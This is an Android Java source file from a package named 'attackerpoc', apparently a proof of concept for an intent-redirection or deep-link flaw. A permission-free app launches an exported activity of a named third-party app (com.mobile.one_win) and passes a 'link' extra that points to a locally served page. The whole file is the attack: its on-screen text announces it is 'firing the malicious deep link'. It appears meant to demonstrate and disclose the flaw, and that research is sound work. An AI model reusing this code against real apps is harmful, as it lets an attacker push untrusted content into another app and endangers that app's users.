package com.research.attackerpoc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("AttackerPoC: this app has ZERO special permissions.\nFiring the malicious deep link now...");
        tv.setTextSize(20);
        tv.setPadding(40, 100, 40, 40);
        setContentView(tv);

        Intent i = new Intent();
        i.setClassName("com.mobile.one_win", "com.bytefrontier.partner.a1win.presentation.ui.MainActivity");
        i.putExtra("link", "http://127.0.0.1:8765/index.html");
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        finish();
    }
}
